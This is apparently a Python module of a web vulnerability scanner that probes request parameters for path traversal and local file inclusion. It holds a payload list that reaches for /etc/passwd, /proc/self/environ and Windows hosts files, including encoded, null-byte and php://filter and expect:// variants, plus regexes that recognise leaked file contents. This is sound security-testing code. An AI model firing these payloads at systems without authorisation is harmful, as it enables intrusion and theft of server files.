"""
mod_path_traversal.py — Path Traversal / Local File Inclusion (LFI) module.

Covers:
  • Classic directory traversal sequences (../../etc/passwd)
  • URL-encoded and double-encoded variants
  • Null-byte injection
  • Windows path traversal
  • PHP wrappers (php://filter, expect://)
"""

import re
import logging
from typing import Any, Dict, List

from my_scan.modules.base import BaseModule, CRITICAL, HIGH, MEDIUM

logger = logging.getLogger("mod_path_traversal")

# ── Payloads ─────────────────────────────────────────────────────────────────

LFI_PAYLOADS = [
    # Unix — basic
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    # URL-encoded
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # Double-encoded
    "..%252F..%252F..%252Fetc%252Fpasswd",
    # Dot-dot-slash obfuscation
    "....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\etc\\\\passwd",
    # Null byte
    "../../../../etc/passwd%00",
    "../../../../etc/passwd\x00",
    # Windows
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=/etc/passwd",
    "expect://id",
    # /proc filesystem
    "../../../../proc/self/environ",
    "/etc/passwd",
    # Windows sensitive files
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:/Windows/System32/drivers/etc/hosts",
]

# ── Detection patterns ────────────────────────────────────────────────────────

LFI_PATTERNS = [
    # Unix passwd file
    re.compile(r"root:x:0:0:", re.IGNORECASE),
    re.compile(r"daemon:x:\d+:\d+:", re.IGNORECASE),
    re.compile(r"/bin/(bash|sh|dash|nologin)", re.IGNORECASE),
    # Windows hosts file
    re.compile(r"127\.0\.0\.1\s+localhost", re.IGNORECASE),
    re.compile(r"::1\s+localhost", re.IGNORECASE),
    # PHP wrapper output (base64 of PHP file)
    re.compile(r"PD9waHA", re.IGNORECASE),   # base64 for "<?ph"
    # /proc/self/environ
    re.compile(r"DOCUMENT_ROOT=", re.IGNORECASE),
    re.compile(r"HTTP_HOST=", re.IGNORECASE),
    # PHP errors that reveal path
    re.compile(
        r"Warning:.*?(include|require|fopen|file_get_contents).*?/etc/passwd",
        re.IGNORECASE | re.DOTALL,
    ),
    # Java / .NET
    re.compile(r"java\.io\.FileNotFoundException:", re.IGNORECASE),
    re.compile(r"System\.IO\.FileNotFoundException:", re.IGNORECASE),
]

# PHP warning patterns (confirm attempted LFI even if no content leaked)
PHP_WARNING_PATTERN = re.compile(
    r"Warning:.*?(include|require).*?failed to open stream",
    re.IGNORECASE | re.DOTALL,
)


class PathTraversalModule(BaseModule):
    name        = "path_traversal"
    description = "Detects Path Traversal / Local File Inclusion (LFI) vulnerabilities"

    async def run(self, entrypoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        params = self._all_params(entrypoint)

        if not params:
            return findings

        for param_name in params:
            for payload in LFI_PAYLOADS:
                ep   = self._inject_param(entrypoint, param_name, payload)
                resp = await self._send(ep)
                if resp is None:
                    continue
                try:
                    body   = await resp.text()
                    status = resp.status
                finally:
                    resp.release()

                # Direct file content in response
                matched = next((p for p in LFI_PATTERNS if p.search(body)), None)
                if matched:
                    findings.append(self._make_finding(
                        vulnerability="Path Traversal / Local File Inclusion",
                        vuln_id="path_traversal",
                        severity=HIGH,
                        url=entrypoint["url"],
                        method=entrypoint.get("method", "GET"),
                        parameter=param_name,
                        payload=payload,
                        evidence=f"Sensitive file content detected (pattern: '{matched.pattern[:60]}')",
                    ))
                    break

                # PHP warning: confirms LFI attempt was processed
                if PHP_WARNING_PATTERN.search(body):
                    findings.append(self._make_finding(
                        vulnerability="Path Traversal (PHP Warning Leakage)",
                        vuln_id="path_traversal",
                        severity=MEDIUM,
                        url=entrypoint["url"],
                        method=entrypoint.get("method", "GET"),
                        parameter=param_name,
                        payload=payload,
                        evidence="PHP include/require warning leaked in response",
                    ))
                    break

        return findings

    # ------------------------------------------------------------------
    def _all_params(self, ep: Dict[str, Any]) -> List[str]:
        names: List[str] = []
        if ep.get("params"):
            names += list(ep["params"].keys())
        body = ep.get("body", "") or ""
        if body:
            import json as _j
            from urllib.parse import parse_qs as _pqs
            try:
                bd = _j.loads(body)
                if isinstance(bd, dict):
                    names += [k for k in bd if k not in names]
            except Exception:
                pass
            try:
                for k in _pqs(body):
                    if k not in names:
                        names.append(k)
            except Exception:
                pass
        return names
